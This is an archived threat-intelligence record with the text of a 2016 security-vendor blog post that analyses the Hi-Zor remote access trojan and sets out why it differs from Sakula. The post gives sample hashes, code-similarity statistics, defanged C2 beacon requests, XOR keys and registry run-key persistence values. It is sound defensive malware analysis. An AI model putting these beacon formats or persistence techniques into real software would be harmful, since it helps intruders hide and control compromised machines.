{
    "id": "972a69bb-407e-41aa-b636-26e3421118fd",
    "created_at": "2023-01-12T15:06:51.075067Z",
    "updated_at": "2025-03-27T02:10:17.256919Z",
    "deleted_at": null,
    "sha1_hash": "4a490156ccf2ed925914eccf391ca460bf3cf747",
    "title": "2016-01-27 - Introducing Hi-Zor RAT",
    "authors": "",
    "file_creation_date": "2022-05-28T21:52:21Z",
    "file_modification_date": "2022-05-28T21:52:21Z",
    "file_size": 277222,
    "plain_text": "# Introducing Hi-Zor RAT\n\n**fidelissecurity.com/threatgeek/2016/01/introducing-hi-zor-rat**\n\n**Author**\n\nThreat Research Team\n\n\nJanuary 27, 2016\n\n\nThe Fidelis Threat Research team is comprised of expert security researchers whose sole focus is generating\naccurate and actionable intelligence to better secure customers. Together, they represent over... [Read More](https://fidelissecurity.com/threatgeek/author/threat-research-team/)\n\nComments\n\nJanuary 27, 2016\n\nIn Fidelis Threat Advisory #1020 (FTA), we provided comprehensive analysis of a tool that had been observed in a\ncampaign called INOCNATION. Fidelis Threat Research is now confident that the malware observed in that\ncampaign is a new Remote Access Trojan (RAT) that we are calling Hi-Zor RAT based on strings observed in the\nsample.\n\nHi-Zor RAT uses the following techniques, some of which have been observed in other APT tools:\n\nUses string-stacking, a technique observed in the Etumbot and Ixeshe families.\nCreates a copy of itself in the systems with a ‘.dat’ extension and entrenches it in the registry run key with\n‘regsvr32.exe’ pointing to a DLL file without a DLL extension. This technique has been observed in the Derusbi\nmalware.\nSends a victim’s Volume Serial Number information in the beacon. This technique has been observed in\nSakula.\n\n\n-----\n\nDouble XOR to encode command and control.\nUses common applications, such as VPN installers, as the decoy. This tactic has been observed in Sakula.\n\nBeyond these techniques, it provides core RAT features such as:\n\nProcess execution\nReverse shell\nFile management\nUpload/Download\nKill switch/Uninstall\n\nFidelis Threat Advisory #1020 provides detailed analysis of these facets. New indicators and an updated Yara rule\n[are available for download here.](https://github.com/fideliscyber)\n\nThere are few samples of Hi-Zor RAT that have been observed in public malware repositories such as VirusTotal. In\nour estimation, Hi-Zor RAT represents continued investment and tooling by APT actors and it is our expectation that it\nwill feature in future intrusions.\n\n## Why is the Hi-Zor RAT not Sakula?\n\n[Crowdstrike first notified the world about this tool in their blog post ‘Sakula Reloaded.’ The following analysis is why](https://www.crowdstrike.com/blog/sakula-reloaded/)\nwe’re defining Hi-Zor to be distinct from Sakula RAT.\n\nOur comparative analysis is based on the following Hi-Zor malware sample related to the INOCNATION campaign:\n\n**MD5** **SHA256**\n\n75d3d1f23628122a64a2f1b7ef33f5cf cd07ac5947c643854375603800a4f70e2dfe202c8a1f801204328921cb3a2a4c\n\nAs a reference, to obtain publicly documented samples of Sakula, we used the article released by Dell SecureWorks:\n[Sakula Malware Family](https://www.secureworks.com/cyber-threat-intelligence/threats/sakula-malware-family/)\n\n**MD5** **SHA256**\n\nf25cc334809bd1c36fd94184177de8a4 2b4cc716ec23a095d831069968d951a125f40574775f466f4251c8a0a37abfca\n\nSome differences were found between the above samples:\n\n### 1. Code comparison with BinDiff\n\nComparing the code with the Google BinDiff, the tool found that only 5% of the code is similar.\n\n**Name** **Value**\n\nbasicBlock matches (library) 116\n\nbasicBlock matches (non-library) 65\n\nbasicBlocks primary (library) 65\n\nbasicBlocks primary (non-library) 327\n\nbasicBlocks secondary (library) 3161\n\nbasicBlocks secondary (non-library) 423\n\nflowGraph edge matches (library) 93\n\n\n-----\n\n**Name** **Value**\n\nflowGraph edge matches (non-library) 40\n\nflowGraph edges primary (library) 93\n\nflowGraph edges primary (non-library) 440\n\nflowGraph edges secondary (library) 4489\n\nflowGraph edges secondary (non-library) 586\n\nfunction matches (library) 30\n\nfunction matches (non-library) 49\n\nfunctions primary (library) 6\n\nfunctions primary (non-library) 101\n\nfunctions secondary (library) 246\n\nfunctions secondary (non-library) 153\n\ninstruction matches (library) 285\n\ninstruction matches (non-library) 254\n\ninstructions primary (library) 242\n\ninstructions primary (non-library) 4692\n\ninstructions secondary (library) 13158\n\ninstructions secondary (non-library) 2945\n\nbasicBlock: MD index matching (bottom up) 3\n\nbasicBlock: MD index matching (top down) 4\n\nbasicBlock: call reference matching 2\n\nbasicBlock: edges Lengauer Tarjan dominated 4\n\nbasicBlock: edges MD index (bottom up) 18\n\nbasicBlock: edges MD index (top down) 37\n\nbasicBlock: edges prime product 19\n\nbasicBlock: entry point matching 20\n\nbasicBlock: exit point matching 5\n\nbasicBlock: exit point matching 2\n\nbasicBlock: jump sequence matching 2\n\nbasicBlock: loop entry matching 2\n\nbasicBlock: prime matching (0 instructions minimum) 4\n\nbasicBlock: propagation (size==1) 53\n\nbasicBlock: relaxed MD index matching 4\n\n\n-----\n\n**Name** **Value**\n\nbasicBlock: self loop matching 2\n\nfunction: MD index matching (flowgraph MD index, top down) 1\n\nfunction: address sequence 2\n\nfunction: call reference matching 3\n\nfunction: call sequence matching(exact) 13\n\nfunction: call sequence matching(sequence) 39\n\nfunction: loop count matching 1\n\nfunction: name hash matching 20\n\n**Confidence** **0.267055127**\n\n**Similarity** **0.053533386**\n\n### 2. IDA code decompilation\n\nThe following screenshots show the main SWITCH statements between the samples showing their difference (click to\nenlarge):\n\n**3. Network traffic**\n\nThe network traffic between both samples is also different. The Sakula samples beacons out with the following traffic:\n\nPOST /newimage.asp?imageid=ivpgvz–1004122437&type=0&resid=365854765 HTTP/1.1\nUser-Agent: iexplorer\n\nHost: citrix.vipreclod[dot]com\n\nContent-Length: 176\n\nCache-Control: no-cache\n\n[The malware discussed in Fidelis Threat Advisory #1020 beacons over a secure connection (e.g. TLS) with the](https://fidelissecurity.com/sites/default/files/FTA_1020_Fidelis_Inocnation_FINAL.pdf)\nfollowing traffic:\n\nPOST /-1004122437VICTIM.1a53b0cp32e46g0qio9 HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko\n\nHost: inocnation[dot]com\n\nContent-Length: 8\n\nConnection: Keep-Alive\n\nIn the above traffic, both samples send the Volume Serial Number in the same format, but the traffic is still different.\nThe traffic from the Hi-Zor sample includes the victim’s system Computer Name and is sent over a secure\nconnection.\n\n### 4. String obfuscation\n\n\n-----\n\nIn the Sakula sample analyzed, the malware configuration (e.g. C2, URL, Filename, etc.) is obfuscated with a single\nbyte XOR key of “0x56”.\n\nIn the Hi-Zor sample, the C2 configuration is obfuscated with a double XOR with the following keys: “0x70” and\n“0x79”.\n\nThe string stacking technique is also widely used in the Hi-Zor sample, while this technique is not observed in the\nSakula sample inspected.\n\n### 5. File type\n\nThe Sakula malware is a “.EXE” file and the malware in the FTA is a “.DLL” file.\n\n### 6. Registry entrenchment\n\nThe Sakula malware entrenches in the system here:\n\nKey:         HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun\nValue name:  MicroMedia\n\nValue data:   %TEMP%MicroMediaMediaCenter.exe\n\nWhile the Hi-Zor sample entrenches in the system here:\n\nKey:         HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionRun\n\nValue name:  AdobePlayer\n\nValue data:   regsvr32 /s “%APPDATA%adobeadobe.dat”\n\n### 7. Embedded files\n\nThe Sakula sample inspected contained a 32-bits and a 64-bits DLL obfuscated in its resource section. These DLLs\nwere decoded with a single-byte XOR key of 0x24. The decoding process skipped values with the same XOR key\nand null (0) values. According to SecureWorks, this code is used for UAC bypass. This is not observed in the Hi-Zor\nsample.\n\nDue to these differences between the sample in FTA #1020 and the Sakula samples inspected, we have decided to\ndistinguish the malware reverse engineered in the FTA and assign it the distinctive name Hi-Zor. More malware threat\nanalysis to come in future blogs and Fidelis Threat Advisories.\n\n_-The Fidelis Threat Research Team_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2016/2016-01-27 - Introducing Hi-Zor RAT.pdf"
    ],
    "report_names": [
        "2016-01-27 - Introducing Hi-Zor RAT.pdf"
    ],
    "threat_actors": [
        {
            "id": "d18fe42c-8407-4f96-aee0-a04e6dce219a",
            "created_at": "2023-01-06T13:46:38.275292Z",
            "updated_at": "2025-03-27T02:00:02.79092Z",
            "deleted_at": null,
            "main_name": "APT12",
            "aliases": [
                "Calc Team",
                "IXESHE",
                "BRONZE GLOBE",
                "BeeBus",
                "DynCalc",
                "DNSCalc",
                "Crimson Iron",
                "NUMBERED PANDA",
                "TG-2754",
                "Group 22"
            ],
            "source_name": "MISPGALAXY:APT12",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6a660ea2-1118-404a-9f8f-f0d6a1e9f184",
            "created_at": "2022-10-25T15:50:23.685924Z",
            "updated_at": "2025-03-27T02:00:55.52357Z",
            "deleted_at": null,
            "main_name": "APT12",
            "aliases": [
                "APT12",
                "IXESHE",
                "DynCalc",
                "Numbered Panda",
                "DNSCALC"
            ],
            "source_name": "MITRE:APT12",
            "tools": [
                "Ixeshe",
                "RIPTIDE",
                "HTRAN"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536011,
    "ts_updated_at": 1743041417,
    "ts_creation_date": 1653774741,
    "ts_modification_date": 1653774741,
    "files": {
        "pdf": "https://archive.orkl.eu/4a490156ccf2ed925914eccf391ca460bf3cf747.pdf",
        "text": "https://archive.orkl.eu/4a490156ccf2ed925914eccf391ca460bf3cf747.txt",
        "img": "https://archive.orkl.eu/4a490156ccf2ed925914eccf391ca460bf3cf747.jpg"
    }
}